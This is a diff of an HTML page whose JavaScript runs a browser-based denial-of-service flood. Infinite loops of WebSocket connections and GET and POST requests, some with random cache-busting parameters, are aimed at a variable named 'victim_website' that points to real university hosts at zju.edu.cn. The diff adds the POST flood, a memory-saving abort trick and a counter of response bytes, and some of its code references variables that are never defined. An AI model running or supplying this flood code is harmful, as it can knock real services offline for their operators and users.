@@ -4,26 +4,31 @@
 </head>
 
 <body>
-    <input type="submit" value="WebSocket" style="margin-left:10px" onclick="while_loop_ws()" /> 
-	<input type="submit" value=" C O R " style="margin-left:10px" onclick="do_it()" />
+	<input type="submit" value="WebSocket" style="margin-left:10px" onclick="while_loop_ws()" /> 
+	<input type="submit" value="COR GET" style="margin-left:10px" onclick="do_it()" />
 	<div id="result"></div>
-  
-  <script type="text/javascript">
-  //<![CDATA[
+	<div id="debug"></div>
+	<script type="text/javascript" src="string.js"></script>
+	<script type="text/javascript">
+	//<![CDATA[
+	var thread_count = 1;
     var scan_counter = 0;
-    var victim_website = "cspo.zju.edu.cn";//"www.cs.zju.edu.cn";
+	var resp_size_counter = 0;
+    var victim_website = "www.cs.zju.edu.cn";//"www.zju.edu.cn";
 	
 	var Sys = {};
 	var ua = navigator.userAgent.toLowerCase();
 	var s;
 	(s = ua.match(/msie ([\d.]+)/)) ? Sys.ie = s[1] : 0;
+	var xhr;
     if (!Sys.ie)
     {
-		var xhr = new XMLHttpRequest();
+		xhr = new XMLHttpRequest();
+		xhr.onreadystatechange = processResp;
 	}
 	else
 	{
-		var xdr = new XDomainRequest();
+		xdr = new XDomainRequest();
 		xdr.onerror = err;
         xdr.ontimeout = timeo;
         xdr.onprogress = progres;
@@ -53,7 +58,7 @@
     {
         try
         {
-            ws = new WebSocket("ws://" + victim_website + ":80");
+            ws = new WebSocket("ws://" + victim_website);
             scan_counter = scan_counter+1;
             setTimeout("while_loop_ws()",0);
         }
@@ -64,25 +69,58 @@
         }
         document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
     }
-    function while_loop_cor()
-    {
+	function while_loop_cor()
+	{
         try
         {
-            xhr.abort();//解决内存耗费的关键在这里。
-            scan_counter = scan_counter+1;
-            xhr = new XMLHttpRequest();
-            xhr.open('GET', "http://" + victim_website + ":80");
-            xhr.send();             
-  
-            setTimeout("while_loop_cor()",0);
+			xhr.abort();//解决内存耗费的关键在这里。
+			scan_counter = scan_counter+1;
+			xhr = new XMLHttpRequest();
+			xhr.open('GET', "http://" + victim_website );// + Math.round(Math.random()*100000));
+			xhr.onreadystatechange = function()
+					{
+						if (xhr.readyState==4)
+						{
+							resp_size_counter = resp_size_counter+xhr.responseText.length;
+							document.getElementById("debug").innerHTML=resp_size_counter;
+						}
+					};
+			xhr.onerror = function(e)
+					{
+						//alert(e);
+					} 
+			xhr.send();
+			setTimeout("while_loop_cor()",0);
         }
         catch(err)
         {
-            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "<\/b>";
+            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "</b>";
             return;
         }
-        document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
-    }
+		document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "</b>";
+	}
+   	function while_loop_cor_post()
+	{
+        try
+        {
+			xhr.abort();//解决内存耗费的关键在这里。
+			scan_counter = scan_counter+1;
+			xhr = new XMLHttpRequest();
+			fullUrl = "http://" + victim_website +"?jQ1="+Math.floor(Math.random()*10000000000);
+			xhr.open("POST", fullUrl, true);
+			xhr.setRequestHeader("Content-Type","text/plain; charset=utf-8");
+			//xhr.setRequestHeader("User-Agent","baidubot");
+			//xhr.send(Math.random()*1000 + "=" + Math.random()*10000000000);
+			xhr.send(post_data);
+            setTimeout("while_loop_cor_post()",0);
+        }
+        catch(err)
+        {
+            document.getElementById('result').innerHTML += "<b>Scan stopped. Exception: " + err + "</b>";
+            return;
+        }
+		document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "</b>";
+	}
 	function while_loop_ie()
 	{
 		try
@@ -102,13 +140,20 @@
         }
         document.getElementById('result').innerHTML = "<b>Current counter: " + scan_counter + "<\/b>";
     }
+	function processResp()
+	{
+		if (xmlhttp.readyState==4){
+			document.getElementById("debug").innerHTML = "YES";//(xmlhttp.responseText);
+		}
+	}
     function do_it()
     {
 		if (!Sys.ie)
         {
 			var i = 0;
-			while(i<50)
+			while(i<thread_count)
 			{
+				//while_loop_cor_post();
 				while_loop_cor();
 				i++;
 			}
@@ -116,14 +161,14 @@
 		else
 		{
 			var i = 0;
-            while(i<50)
+            while(i<thread_count)
             {
 				while_loop_ie();
 				i++;
 			}
 		}
     }
-  //]]>
-  </script>
+	//]]>
+	</script>
 </body>
 </html>
